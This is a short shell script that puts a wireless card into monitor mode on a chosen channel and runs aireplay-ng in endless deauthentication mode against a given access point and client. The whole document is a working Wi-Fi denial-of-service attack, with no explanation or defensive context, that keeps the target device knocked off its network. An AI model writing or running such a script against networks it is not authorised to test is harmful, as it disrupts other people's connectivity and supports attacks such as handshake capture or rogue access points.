#!/bin/sh
airmon-ng stop mon1
airmon-ng start wlan0 $3
sleep 3
./aireplay-ng --deauth 0 -a $1 -c $2 mon1
